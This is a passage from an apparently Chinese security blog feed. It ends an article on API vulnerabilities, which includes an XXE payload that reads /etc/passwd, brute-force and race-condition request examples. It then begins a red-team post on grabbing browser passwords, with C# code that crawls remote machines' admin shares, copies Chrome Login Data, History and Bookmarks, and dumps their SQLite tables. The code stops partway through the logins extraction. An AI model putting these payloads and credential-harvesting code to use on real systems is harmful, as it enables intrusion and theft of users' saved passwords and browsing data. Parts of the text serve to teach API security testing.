。</p><p>如果你知道一个与API互动的应用程序，你可以分析该应用程序的JavaScript，以收集可能被访问的API端点的列表。这里建议使用API字典来进行模糊测试。通过遍历的方式来发现表面不易发现的接口。虽然这块在下面的解决方法中建议采用类似于swagger这种比较成熟的API功能，但是配置不当也有可能导致对应的接口披露。例如说：</p><p><img src="API%E6%BC%8F%E6%B4%9E%5C1662900142841-073298bf-34aa-40c2-8691-9d1fd8326461.png" alt="img"></p><p>这种就是直接披露了应用环境的接口信息。</p><h3 id="6、版本差异风险"><a href="#6、版本差异风险" class="headerlink" title="6、版本差异风险"></a>6、版本差异风险</h3><p>当一个组织发布一个API时，它可能与许多不同的应用程序对接。如果API在任何时候被更新，它可能会对这些应用程序中的一个或多个引入破坏性的变化。出于这个原因，多个API版本经常被实施，作为支持旧的API模式的一种手段，同时也为新的用户逐步升级API。</p><p>测试所有版本的API是值得的。旧版本可能仍有安全问题，这些问题后来在新版本中得到了修复，而较新的&#x2F;边界&#x2F;测试版可能引入了新的安全问题。</p><p>api版本管理的一个常见模式是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/v1/        /api/v2/       /api/beta/</span><br></pre></td></tr></table></figure><p>以及未投产时的生产环境入口：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">qa</span><br><span class="line">devenv</span><br><span class="line">devenv1</span><br><span class="line">devenv2</span><br><span class="line">preprod</span><br><span class="line">pre-prod</span><br><span class="line">test</span><br><span class="line">testing</span><br><span class="line">staging</span><br><span class="line">stage</span><br><span class="line">dev</span><br><span class="line">development</span><br><span class="line">deploy</span><br><span class="line">slave</span><br><span class="line">master</span><br><span class="line">review</span><br><span class="line">prod</span><br><span class="line">uat</span><br><span class="line">prep</span><br><span class="line">Version2</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h3 id="7、无速率限制导致批量请求攻击"><a href="#7、无速率限制导致批量请求攻击" class="headerlink" title="7、无速率限制导致批量请求攻击"></a>7、无速率限制导致批量请求攻击</h3><p>大多数时候，API对用户的请求次数没有任何保护。这被称为 “缺乏速率限制”，当攻击者可以调用API数千次以导致一些非预期的行为时，就会发生这种情况。服务器将试图满足这些请求中的每一个，这有可能通过对服务器进行超负荷的请求，使其处于DOS状态 允许攻击者快速渗出敏感的用户信息，如：用户ID、用户名、电子邮件等。即枚举。通过强制执行一个向受害者发送电子邮件&#x2F;短信的功能，淹没受害者的收件箱。即短信dos攻击、邮箱dos攻击。</p><p>例如说看一个攻击场景，在一个检查证书的API端点上没有速率限制。GET &#x2F;api&#x2F;v1&#x2F;user&#x2F;1234&#x2F;login&#x2F;?password&#x3D;password</p><p>通常情况下，你不会看到在这样的GET请求中发送密码，但为了本演示的目的，假设你看到了。为了对上述端点中的密码进行暴力攻击，攻击者可以使用BurpSuite’s Intruder ）工具。这个工具允许我们定制不同种类的暴力攻击，但在这个例子中，我们将给它提供一个简单的密码列表。</p><p>在几秒钟的时间里，入侵者将发出数百个API请求，在每个请求中尝试使用不同的密码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /api/v1/user/<span class="number">1234</span>/login/?password=falsepassword1</span><br><span class="line">GET /api/v1/user/<span class="number">1234</span>/login/?password=falsepassword2</span><br><span class="line">GET /api/v1/user/<span class="number">1234</span>/login/?password=falsepassword3</span><br><span class="line">. . .</span><br><span class="line">GET /api/v1/user/<span class="number">1234</span>/login/?password=correctpassword!</span><br></pre></td></tr></table></figure><p>为了防止速率限制的错误，应用程序应该对用户在一定时间范围内请求API的频率进行限制。设置的确切限制将取决于该API或端点的使用情况。</p><h3 id="8、接口竞争条件攻击"><a href="#8、接口竞争条件攻击" class="headerlink" title="8、接口竞争条件攻击"></a>8、接口竞争条件攻击</h3><p>竞争条件是指两个或更多的请求在同一毫秒内被发送到一个API。当一个API没有处理这种情况的机制时，会导致API以非预期的方式处理这些请求。</p><p>一个潜在的竞赛条件的攻击场景可能是在一个有漏洞的电子商务应用程序上兑换折扣或促销代码时出现。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/discount</span><br><span class="line">Target: www.angus.com</span><br><span class="line">Connection: <span class="built_in">close</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;code&quot;</span>,<span class="string">&quot;200&quot;</span>,</span><br><span class="line"><span class="string">&quot;amount&quot;</span>:<span class="string">&quot;10&quot;</span></span><br></pre></td></tr></table></figure><p>BurpSuite有一个名为Turbo Intruder的扩展，允许用户使用内置的race.py 脚本来测试竞争条件。&#x2F;&#x2F;该工具非常实用测并发，其并发包速率最快可达到每秒2W个。</p><p>在Turbo Intruder中配置好攻击后，攻击者可以向API发送多个并发请求，以换取这个优惠代码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/discount <span class="number">200</span> OK</span><br><span class="line">POST /api/v1/discount <span class="number">200</span> OK</span><br><span class="line">POST /api/v1/discount <span class="number">200</span> OK</span><br><span class="line">POST /api/v1/discount <span class="number">404</span> Not Found</span><br><span class="line">POST /api/v1/discount <span class="number">404</span> Not Found</span><br></pre></td></tr></table></figure><p>如果API在收到第一个并发请求后没有立即使促销代码失效，那么折扣金额可能会增加一倍、两倍。</p><p>包括像有的短信炸弹无法正常批量获取的时候也可利用竞争条件绕过批量获取。尽管有图形验证码限制，但依旧可绕过。</p><p><img src="API%E6%BC%8F%E6%B4%9E%5C1662900301526-6fc39d7f-ab34-4d22-9f63-0b142a8d169c.png" alt="img"></p><p>竞争条件攻击是攻击者发送修改资源的请求的速度与应用程序更新该特定资源的速度之间的竞赛。</p><h3 id="9、XML注入"><a href="#9、XML注入" class="headerlink" title="9、XML注入"></a>9、XML注入</h3><p>XXE代表XML外部实体，这种注入漏洞可以在任何使用API处理XML数据的地方测试。SOAP APIs也可能受到XXE注入的攻击，因为它们是基于XML的。<br>一个使用XML的API端点看起来是这样的。</p><p><img src="API%E6%BC%8F%E6%B4%9E%5C1662900315153-6691be4e-89f1-44f1-8090-ff0e0fa4842e.png" alt="img"></p><p>XXE注入是指当攻击者注入指定DTD之外的自定义外部实体。一旦这些外部实体被API解析，它可以让攻击者访问应用程序的内部文件，升级到SSRF，将敏感数据泄露给攻击者控制的域或DOS服务器。</p><p>这是一个请求的例子，攻击者注入了一个名为xxe的外部自定义实体，这个实体的目的是为了检索一个内部文件。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /soap/v2/user HTTP/<span class="number">1.1</span></span><br><span class="line">Host: angus.com</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;!DOCTYPE ah [&lt;!ENTITY xxe</span><br><span class="line">SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;]&gt;</span><br><span class="line">&lt;SOAP-ENV:Envelope&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">&lt;getUser&gt;</span><br><span class="line">&lt;id&gt;&amp;xxe injection;&lt;/id&gt;</span><br><span class="line">&lt;/getUser&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure><p>如果API允许使用标准的XML解析器来处理数据，那么这个注入的外部实体将被应用程序处理并将&#x2F;etc&#x2F;passwd的内容返回给攻击者。例如说XML的用户名枚举。</p><p><img src="API%E6%BC%8F%E6%B4%9E%5C1662900029180-7e9f1e53-e2c9-43eb-bd7f-5c1b9d93bb34.png" alt="img"></p><h3 id="10、Content类型转换"><a href="#10、Content类型转换" class="headerlink" title="10、Content类型转换"></a>10、Content类型转换</h3><p>即使API可能使用JSON作为数据格式进行通信，底层服务器&#x2F;框架仍然可能接受其他数据格式，如XML。因此，当看到一个API的content-Type 为application&#x2F;json 时，仍然可以通过将其值切换为Content-Type: text&#x2F;xml 来尝试测试XXE。</p><p>例如，如果一个API使用JSON</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/user HTTP/<span class="number">1.1</span></span><br><span class="line">Host: angus.com</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>它可以被修改为以这种方式发送XML数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /soap/v2/user HTTP/<span class="number">1.1</span></span><br><span class="line">Host: angus.com</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;!DOCTYPE ah [&lt;!ENTITY xxe</span><br><span class="line">SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;]&gt;</span><br></pre></td></tr></table></figure><p>还有的就是我们常见的各类注入攻击，包括sql注入、命令注入等，就不在叙述了。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浏览器密码抓取</title>
      <link href="/2022/09/11/google&amp;firefox%E5%AF%86%E7%A0%81/"/>
      <url>/2022/09/11/google&amp;firefox%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="google"><a href="#google" class="headerlink" title="google"></a>google</h1><h2 id="1-chrome浏览器的一些保存文件在"><a href="#1-chrome浏览器的一些保存文件在" class="headerlink" title="1.chrome浏览器的一些保存文件在"></a>1.chrome浏览器的一些保存文件在</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default</span><br></pre></td></tr></table></figure><p>其中重要的文件为</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Bookmarks 书签</span><br><span class="line">History 历史记录</span><br><span class="line">Login Data 保存密码相关记录</span><br></pre></td></tr></table></figure><p>Login Data为sqlite保存形式，书签是json格式</p><h2 id="2-脚本自动化收集信息"><a href="#2-脚本自动化收集信息" class="headerlink" title="2.脚本自动化收集信息"></a>2.脚本自动化收集信息</h2><p><strong>cover：</strong> <strong>红队蓝军</strong></p><p>创建machine.txt，逐行读取机器。</p><p>获取当前路径创建TargetChromeFiles目录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> currentpath = Directory.GetCurrentDirectory();</span><br><span class="line"><span class="type">string</span> DesktopFiles = currentpath + <span class="string">&quot;\\TargetChromeFiles&quot;</span>;</span><br></pre></td></tr></table></figure><p>遍历users目录如果存在&#96;&#96;&#96;C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default&#96;&#96;如果存在创建机器名文件夹以及对应的用户名文件夹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> userpath = @<span class="string">&quot;\\&quot;</span> + machine + @<span class="string">&quot;\c$\users&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> user_list = Directory.EnumerateDirectories(userpath);</span><br><span class="line">foreach (<span class="type">string</span> user in user_list)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="type">string</span> ChromePath = user + <span class="string">&quot;\\AppData\\Local\\Google\\Chrome\\User Data\\Default&quot;</span>;</span><br><span class="line"> <span class="type">string</span> username = substring(user);</span><br><span class="line"> <span class="keyword">if</span> (Directory.Exists(ChromePath))&#123;</span><br><span class="line">  <span class="type">string</span> MachineFolder = DesktopFiles + <span class="string">&quot;\\&quot;</span> + machine;</span><br><span class="line">  Directory.CreateDirectory(MachineFolder);</span><br><span class="line">  <span class="type">string</span> UserFolder = MachineFolder + <span class="string">&quot;\\&quot;</span> + username;</span><br><span class="line">  Directory.CreateDirectory(UserFolder);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取对应机器以及用户的历史记录文件</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> historyPath = ChromePath + <span class="string">&quot;\\History&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(historyPath))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">string</span> historyfile = UserFolder + <span class="string">&quot;\\History&quot;</span>;</span><br><span class="line">    StreamWriter history_file = File.CreateText(historyfile);</span><br><span class="line">    history_file.Close();</span><br><span class="line">    <span class="type">bool</span> isrewrite = <span class="literal">true</span>;</span><br><span class="line">    File.Copy(historyPath, historyfile, isrewrite);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在就继续创建History文件，同理书签和密码保存位置</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> loginPath = ChromePath + <span class="string">&quot;\\Login Data&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(loginPath))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">string</span> loginfile = UserFolder + <span class="string">&quot;\\Login Data&quot;</span>;</span><br><span class="line">    StreamWriter login_file = File.CreateText(loginfile);</span><br><span class="line">    login_file.Close();</span><br><span class="line">    <span class="type">bool</span> isrewrite = <span class="literal">true</span>;</span><br><span class="line">    File.Copy(loginPath, loginfile, isrewrite);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">string</span> BookPath = ChromePath + <span class="string">&quot;\\Bookmarks&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(BookPath))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">string</span> bookfile = UserFolder + <span class="string">&quot;\\Bookmarks&quot;</span>;</span><br><span class="line">    StreamWriter book_file = File.CreateText(bookfile);</span><br><span class="line">    book_file.Close();</span><br><span class="line">    <span class="type">bool</span> isrewrite = <span class="literal">true</span>;</span><br><span class="line">    File.Copy(BookPath, bookfile, isrewrite);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>dump效果</p><p><img src="1662902053082-bf233ada-65c9-46e4-abf8-380e32048dda.png" alt="img"></p><p>Login Data为sqlite保存形式</p><p><img src="1662902062078-4f03950a-51d5-42e1-b99c-cf8cc38dd2a6.png" alt="img"></p><p>所以我们需要批量解析本地TargetChromeFiles目录内的所有文件为文本形式。把结果生在在本地的output_TargetChromeInfos目录。</p><p>首先创建该目录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> currentpath = Directory.GetCurrentDirectory();</span><br><span class="line"><span class="type">string</span> getchromeinfopath = currentpath + <span class="string">&quot;\\output_TargetChromeInfos&quot;</span>;</span><br><span class="line">Directory.CreateDirectory(getchromeinfopath);</span><br></pre></td></tr></table></figure><p>遍历TargetChromeFiles目录所有机器，创建对应的机器目录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> ChromeFilesPath = currentpath + <span class="string">&quot;\\TargetChromeFiles&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (Directory.Exists(ChromeFilesPath))</span><br><span class="line">&#123;</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.Yellow;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;[*]开始解析chrome浏览器信息&quot;</span>);</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">    <span class="keyword">var</span> machine_list = Directory.EnumerateDirectories(ChromeFilesPath);</span><br><span class="line">    foreach (<span class="type">string</span> machine in machine_list)</span><br><span class="line">    &#123;</span><br><span class="line">        Console.ForegroundColor = ConsoleColor.Yellow;</span><br><span class="line">        <span class="type">string</span> out_machine_info = substring(machine);   <span class="comment">//获取结尾地址</span></span><br><span class="line">        Console.WriteLine(<span class="string">&quot;[*]&quot;</span> + out_machine_info);</span><br><span class="line">        Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">        <span class="comment">//创建本地机器文件夹</span></span><br><span class="line">        <span class="type">string</span> getmachinepath = getchromeinfopath + <span class="string">&quot;\\&quot;</span> + out_machine_info;</span><br><span class="line">        Directory.CreateDirectory(getmachinepath);</span><br></pre></td></tr></table></figure><p>继续创建用户目录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> user_list = Directory.EnumerateDirectories(machine);</span><br><span class="line"> foreach (<span class="type">string</span> user in user_list)</span><br><span class="line"> &#123;</span><br><span class="line">     Console.ForegroundColor = ConsoleColor.Yellow;</span><br><span class="line">     <span class="type">string</span> out_user_info = substring(user);</span><br><span class="line">     Console.WriteLine(<span class="string">&quot;   &quot;</span> + out_user_info);</span><br><span class="line">     Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">     <span class="type">string</span> getuserpath = getmachinepath + <span class="string">&quot;\\&quot;</span> + out_user_info;</span><br><span class="line">     Directory.CreateDirectory(getuserpath);</span><br></pre></td></tr></table></figure><p>因为书签是json格式，这里我没有做任何处理。直接把内容写进out目录的Bookmarks文件了。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> book_path = user + <span class="string">&quot;\\Bookmarks&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(book_path))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">string</span> getbookpath = getuserpath + <span class="string">&quot;\\Bookmarks&quot;</span>;</span><br><span class="line">    StreamWriter bookmark = File.CreateText(getbookpath);</span><br><span class="line">    bookmark.Close();</span><br><span class="line">    File.Copy(book_path, getbookpath, <span class="literal">true</span>);</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;      [*]bookmarks parse success&quot;</span>);</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.Red;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;      [-]bookmarks not found&quot;</span>);</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想要好看点可以如果代码来美化一下即可。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from os <span class="keyword">import</span> name</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = open(<span class="string">&#x27;C:/Users/Administrator/AppData/Local/Google/Chrome/User Data/Default/Bookmarks&#x27;</span>,encoding=<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">while True:</span><br><span class="line">    line = f.readline()</span><br><span class="line">    <span class="keyword">if</span> not line:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        try:</span><br><span class="line">            line.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        except:</span><br><span class="line">            res = (str(line))</span><br><span class="line">            url_re = re.compile(<span class="string">&#x27;&quot;url&quot;: &quot;(.*?)&quot;&#x27;</span>,re.I|re.S)</span><br><span class="line">            name_re = re.compile(<span class="string">&#x27;&quot;name&quot;: &quot;(.*?)&quot;&#x27;</span>,re.I|re.S)</span><br><span class="line">            url_result = url_re.findall(res)</span><br><span class="line">            name_result = name_re.findall(res)</span><br><span class="line">            <span class="keyword">for</span> url in url_result: </span><br><span class="line">                <span class="built_in">print</span>(url)</span><br></pre></td></tr></table></figure><p><img src="1662902159151-05916682-ae36-447c-b104-b3b84723a663.png" alt="img"></p><p>看到历史记录文件</p><p><img src="1662902175422-bd9518ee-9b8f-45ba-b6d9-6a8176158588.png" alt="img"></p><p>我们获取想要的即可</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> History_path = user + <span class="string">&quot;\\History&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(History_path))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">string</span> gethistorypath = getuserpath + <span class="string">&quot;\\History.txt&quot;</span>;</span><br><span class="line">    StreamWriter history = File.CreateText(gethistorypath);</span><br><span class="line">    history.Close();</span><br><span class="line">    SQLiteConnection connect = <span class="built_in">new</span> SQLiteConnection(@<span class="string">&quot;Data Source=&quot;</span> + History_path);</span><br><span class="line">    connect.Open();</span><br><span class="line">    SQLiteCommand fcmd = connect.CreateCommand();</span><br><span class="line">    fcmd.CommandText = @<span class="string">&quot;select * from urls&quot;</span>;</span><br><span class="line">    fcmd.CommandType = CommandType.Text;</span><br><span class="line">    SQLiteDataReader r = fcmd.ExecuteReader();</span><br><span class="line">    <span class="type">string</span> HistoryHostof = <span class="string">&quot;host:&quot;</span> + out_machine_info + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    <span class="type">string</span> HistoryMemberof = <span class="string">&quot;user:&quot;</span> + out_user_info + <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line">    File.AppendAllText(gethistorypath, HistoryHostof);</span><br><span class="line">    File.AppendAllText(gethistorypath, HistoryMemberof);</span><br><span class="line">    while (r.Read())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">string</span> title = (<span class="type">string</span>)r[<span class="string">&quot;title&quot;</span>];</span><br><span class="line">        <span class="type">string</span> out_title = <span class="string">&quot;title:&quot;</span> + title + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">string</span> url = (<span class="type">string</span>)r[<span class="string">&quot;url&quot;</span>];</span><br><span class="line">        <span class="type">string</span> out_url =<span class="string">&quot;url:&quot;</span> + url + <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line">        File.AppendAllText(gethistorypath, out_title);</span><br><span class="line">        File.AppendAllText( gethistorypath, out_url);</span><br><span class="line">    &#125;</span><br><span class="line">    connect.Close();</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.Green;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;      [*]history parse success&quot;</span>);</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.Red;</span><br><span class="line">    Console.WriteLine(<span class="string">&quot;      [-]history not found&quot;</span>);</span><br><span class="line">    Console.ForegroundColor = ConsoleColor.White;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于csharp操作sqlite这里不做过多介绍，网上也有很多相关代码和教程。</p><p>最近就是获取密码保存的文件记录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">string</span> LoginData_path = user + <span class="string">&quot;\\Login Data&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (File.Exists(LoginData_path))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">string</span> getloginypath = getuserpath + <span class="string">&quot;\\Login Data.txt&quot;</span>;</span><br><span class="line">    StreamWriter login = File.CreateText(getloginypath);</span><br><span class="line">    login.Close();</span><br><span class="line">    SQLiteConnection connect = <span class="built_in">new</span> SQLiteConnection(@<span class="string">&quot;Data Source=&quot;</span> + LoginData_path);</span><br><span class="line">    connect.Open();</span><br><span class="line">    SQLiteCommand fcmd = connect.CreateCommand();</span><br><span class="line">    fcmd.CommandText = @<span class="string">&quot;select * from logins&quot;</span>;</span><br><span class="line">    fcmd.CommandType = CommandType.Text;</span><br><span class="line">    SQLiteDataReader r = fcmd.ExecuteReader();</span><br><span class="line">    <span class="type">string</span> HistoryHostof = <span class="string">&quot;host:&quot;</span> + out_machine_info + <span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">    <span class="type">string</span> HistoryMemberof = <span class="string">&quot;user:&quot;</span> + out_user_info + <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line">    File.AppendAllText(getloginypath, HistoryHostof);</span><br><span class="line">    File.AppendAllText(getloginypath, HistoryMemberof);</span><br><span class="line">    